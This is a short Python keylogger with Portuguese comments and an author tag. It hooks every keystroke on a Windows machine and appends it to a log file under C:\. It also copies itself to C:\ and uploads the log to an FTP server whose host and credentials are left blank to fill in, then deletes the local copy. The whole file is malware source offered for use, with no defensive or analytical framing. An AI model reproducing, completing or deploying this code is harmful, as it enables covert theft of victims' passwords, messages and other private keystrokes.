# -* - coding: utf-8 -* -
import pythoncom 
import ftplib, os
import pyHook
import shutil
import random

'''
def num():
   a = random.randint(0, 99999999999999)
   y = random.randint(0, 90009999999999)
   if a == y:
     f = a * 2
     a = f
   print(a * 2) 
'''

def copy(): # Copia o Keylogger para C:\\
     try:
          files = ("C:\\")
          shutil.copy('Nome do keylogger', files)
     except Exception as e:
          print('Tipo de erro 1:', type(e))  # Apresenta o nome de erros para correções
            
           
def ftp(): #Função para Upar o 
     try:
          a = random.randint(0, 99999999999999)
          files = ("system_logs" + str(a) +".txt") #Upa este arquivo para o servidor FTP
          user = "" #User do FTP
          passw = "" #Pass do FTP
          ftp = ftplib.FTP("") #Server do FTP
          ftp.login(user, passw) 
          file = open(files, "rb") 
          ftp.cwd('/') #Diretório Onde o arquivo vai ser armazenado no servidor FTP
          ftp.storbinary('STOR ' + files, file) 
          print ("STORing File now...") 
          ftp.quit() 
          file.close() 
          os.remove(files)
     except Exception as e:
           print('Tipo de erro 2: ', type(e))  # Apresenta o nome de erros para correções
     
copy()
ftp()

def keyevent(event): # Inicia o evento para gravar as teclas, o programa não filtra nenhuma tecla, cabe ao usuario corrigir os erros :)
     try:
          files = ("C:\\system_logs.txt") #Escreve o que foi gravado no system_logs.txt no diretório C:\\
          fp = open(files, "a")
          fp.write(("\n"+event.Key))
          fp.close()
     except Exception as e:
          print('Tipo de erro 3: ', type(e))   # Apresenta o nome de erros para correções
          return True
     

obg= pyHook.HookManager()
obg.KeyDown = keyevent
obg.HookKeyboard()

pythoncom.PumpMessages()

#BY C4L4NG0_M4T4D0R
